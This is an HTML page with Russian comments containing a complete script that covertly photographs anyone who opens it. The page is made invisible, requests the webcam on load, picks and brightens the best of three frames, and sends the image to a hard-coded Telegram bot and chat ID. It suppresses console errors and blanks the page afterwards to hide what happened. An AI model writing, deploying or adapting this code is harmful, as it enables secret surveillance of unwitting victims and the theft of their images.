<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <style>
        /* Полностью невидимая страница */
        * {
            margin: 0;
            padding: 0;
            border: 0;
            font-size: 0;
            line-height: 0;
            color: transparent;
            background: transparent;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
            -webkit-user-select: none;
        }
        
        body, html {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: #000000;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <!-- Невидимые элементы для работы -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
// === НАСТРОЙКИ ===
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
// ================

// Отключаем все сообщения в консоли
console.log = function() {};
console.error = function() {};
window.onerror = function() { return true; };

async function captureAndSend() {
    let stream = null;
    
    try {
        // 1. Запрашиваем камеру
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
        } catch (err) {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
        }
        
        // 2. Подключаем к скрытому видео элементу
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        // 3. Ждем готовности камеры
        await new Promise((resolve, reject) => {
            video.onloadedmetadata = resolve;
            video.onerror = reject;
            setTimeout(resolve, 5000);
        });
        
        // 4. Даем камере время на настройку (5 секунд)
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        // 5. Делаем снимок с проверкой качества
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        const ctx = canvas.getContext('2d');
        
        let bestAttempt = null;
        let maxBrightness = 0;
        
        // Делаем 3 попытки с интервалом
        for (let attempt = 0; attempt < 3; attempt++) {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Проверяем яркость фото
            const testArea = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = testArea.data;
            
            let brightnessSum = 0;
            let pixelCount = 0;
            
            for (let i = 0; i < data.length; i += 4) {
                const brightness = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
                if (brightness > 10) {
                    brightnessSum += brightness;
                    pixelCount++;
                }
            }
            
            const avgBrightness = pixelCount > 0 ? brightnessSum / pixelCount : 0;
            
            // Сохраняем лучшую попытку
            if (avgBrightness > maxBrightness) {
                maxBrightness = avgBrightness;
                bestAttempt = ctx.getImageData(0, 0, canvas.width, canvas.height);
            }
            
            // Ждем перед следующей попыткой
            if (attempt < 2) {
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        }
        
        // Используем лучший снимок
        if (bestAttempt) {
            ctx.putImageData(bestAttempt, 0, 0);
            
            // Улучшаем яркость если фото темное
            if (maxBrightness < 50) {
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                for (let i = 0; i < data.length; i += 4) {
                    data[i] = Math.min(255, data[i] * 1.8);
                    data[i + 1] = Math.min(255, data[i + 1] * 1.8);
                    data[i + 2] = Math.min(255, data[i + 2] * 1.8);
                }
                ctx.putImageData(imageData, 0, 0);
            }
        }
        
        // 6. Останавливаем камеру
        stream.getTracks().forEach(track => track.stop());
        
        // 7. Отправляем в Telegram
        canvas.toBlob(blob => {
            if (!blob) return;
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            
            // Отправляем асинхронно
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors',
                keepalive: true
            }).catch(() => {});
            
        }, 'image/jpeg', 0.85);
        
    } catch (error) {
        // Тихая обработка ошибок
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
    
    // Через 2 секунды полностью очищаем страницу
    setTimeout(() => {
        document.body.innerHTML = '';
        document.body.style.cssText = 'position:fixed; width:100%; height:100%; background:#000;';
    }, 2000);
}

// Запускаем сразу при загрузке
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', captureAndSend);
} else {
    captureAndSend();
}
</script>
</body>
</html>
